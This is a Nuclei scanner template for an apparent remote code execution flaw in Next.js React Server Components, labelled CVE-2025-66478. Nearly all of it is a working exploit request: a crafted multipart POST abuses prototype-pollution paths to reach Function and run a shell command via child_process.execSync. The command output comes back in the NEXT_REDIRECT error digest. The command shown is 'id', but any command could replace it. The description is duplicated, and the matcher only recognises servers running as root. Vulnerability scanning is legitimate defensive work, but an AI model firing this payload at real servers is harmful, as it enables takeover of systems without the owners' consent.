id: nextjs-cve-2025-66478-rce-3001

info:
  name: Next.js RSC RCE via NEXT_REDIRECT Digest Injection (CVE-2025-66478)
  author: hxorz
  severity: high
  description: |
  This template detects a Remote Code Execution (RCE) vulnerability in
  vulnerable Next.js React Server Components (RSC) implementations by abusing
  unsafe NEXT_REDIRECT error digest handling via a crafted multipart/form-data
  request.

  The detection works by forcing the backend to execute the following command:
    id

  If the target is vulnerable, the command output will be reflected inside the
  Error.digest field of the RSC response, indicating successful code execution
  on the server side.

    The detection is performed by forcing the backend to execute:
      id

    If successful, the command output (uid=0(root)) is leaked inside
    the Error.digest field of the RSC response.

  reference:
    - https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478
  tags: nextjs,rsc,rce,cve-2025-66478,critical

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: nuclei-rsc-rce-check
        Connection: close
        Accept: */*
        Accept-Language: en
        Content-Type: multipart/form-data; boundary=----hxorzboundary
        Next-Action: x
        X-Nextjs-Html-Request-Id: hxorz
        X-Nextjs-Request-Id: hxorz

        ------hxorzboundary
        Content-Disposition: form-data; name="0"

        {
          "then": "$1:__proto__:then",
          "status": "resolved_model",
          "reason": -1,
          "value": "{\"then\":\"$B1337\"}",
          "_response": {
            "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{timeout:5000}).toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`${res}`});",
            "_chunks": "$Q2",
            "_formData": {
              "get": "$1:constructor:constructor"
            }
          }
        }
        ------hxorzboundary
        Content-Disposition: form-data; name="1"

        "$@0"
        ------hxorzboundary
        Content-Disposition: form-data; name="2"

        []
        ------hxorzboundary--

    matchers:
      - type: regex
        part: body
        regex:
          - "uid=0\\(root\\)"

    extractors:
      - type: regex
        part: body
        regex:
          - "uid=0\\(root\\)[^\"}]+"

